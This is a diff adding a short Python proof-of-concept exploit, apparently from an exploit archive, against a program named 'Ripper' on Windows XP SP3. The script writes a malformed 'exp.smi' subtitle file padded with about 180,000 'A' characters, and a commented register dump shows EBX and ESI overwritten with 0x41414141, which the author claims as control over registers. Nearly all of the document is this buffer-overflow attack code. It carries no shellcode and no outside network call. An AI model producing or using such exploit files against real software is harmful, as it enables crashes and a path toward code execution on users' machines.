@@ -1,0 +1,23 @@
+#!/usr/bin/python
+# Tested on: win XPsp3
+# webpage: d3b4g.info
+
+#EAX 00E1C880
+#EDX 00000001
+#EBX 41414141------------------------------------------------
+#ESP 000D198C
+#EBP 00E1C880          controle over registers
+#ESI 41414141------------------------------------------------
+#EDI 00E1C880
+#EIP 00431302 Ripper.00431302
+#C 0  ES 0023 32bit 0(FFFFFFFF)
+#P 0  CS 001B 32bit 0(FFFFFFFF)
+#A 0  SS 0023 32bit 0(FFFFFFFF)
+#Z 0  DS 0023 32bit 0(FFFFFFFF)
+
+chars = "A"*90000
+crush = "\x41\x41\x41\x41" 
+file=open('exp.smi','w')
+file.write(chars+crush+chars)
+file.close()
+
